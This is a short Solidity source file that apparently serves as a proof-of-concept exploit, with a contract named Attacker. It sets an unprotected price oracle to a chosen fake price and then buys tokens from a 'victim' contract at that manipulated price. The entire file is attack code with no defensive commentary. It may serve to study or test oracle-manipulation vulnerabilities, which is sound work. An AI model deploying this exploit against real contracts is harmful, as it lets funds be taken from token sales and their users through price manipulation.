// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IOracle {
    function setPrice(uint256 _price) external;
}

interface IVictim {
    function buyTokens() external payable;
}

contract Attacker {
    IOracle public oracle;
    IVictim public victim;

    constructor(address _oracle, address _victim) {
        oracle = IOracle(_oracle);
        victim = IVictim(_victim);
    }

    // Only manipulates the oracle price
    function manipulatePrice(uint256 newPrice) public {
        oracle.setPrice(newPrice);
    }

    // Full attack: manipulate price + buy tokens
    function attack(uint256 fakePrice) public payable {
        require(msg.value > 0, "Need ETH for attack");

        // Step 1: manipulate oracle
        oracle.setPrice(fakePrice);

        // Step 2: exploit victim
        victim.buyTokens{value: msg.value}();
    }

    // Needed so contract can receive ETH
    receive() external payable {}
}
